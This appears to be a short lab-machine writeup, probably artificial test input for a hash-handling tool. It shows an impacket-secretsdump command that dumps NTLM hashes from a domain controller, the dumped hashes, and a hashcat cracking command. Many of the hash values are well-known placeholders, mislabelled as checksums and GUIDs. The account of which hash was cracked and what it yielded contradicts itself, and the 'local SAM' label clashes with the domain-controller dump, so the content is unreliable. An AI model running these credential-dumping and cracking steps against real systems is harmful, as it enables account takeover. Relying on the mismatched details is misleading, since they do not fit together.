# Retired-machine writeup with legitimate hashes

Dumped the local SAM database:

```
$ impacket-secretsdump -just-dc-ntlm blackfield.local/svc@10.10.10.192
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
svc_backup:1000:aad3b435b51404eeaad3b435b51404ee:9658d1d1dcd9250115e2205d9f48400d:::
```

NTLM hash: 8846f7eaee8fb117ad06bdd830b7586c

NT hash of the machine account is 31d6cfe0d16ae931b73c59d7e0c089c0 (empty).

Verifying the download before running it:

```
$ md5sum ligolo-ng.tar.gz
c4ca4238a0b923820dcc509a6f75849b  ligolo-ng.tar.gz
```

The ETag was 686897696a7c876b7e000000000000aa, and the object GUID is
d41d8cd98f00b204e9800998ecf8427e.

Cracking it with hashcat:

```
$ hashcat -m 1000 9658d1d1dcd9250115e2205d9f48400d rockyou.txt
```

I grabbed the user flag only after cracking the NTLM hash
8846f7eaee8fb117ad06bdd830b7586c, which gave me the service password.

A sha1 digest is longer and is left alone: 8846f7eaee8fb117ad06bdd830b7586cab12cd34
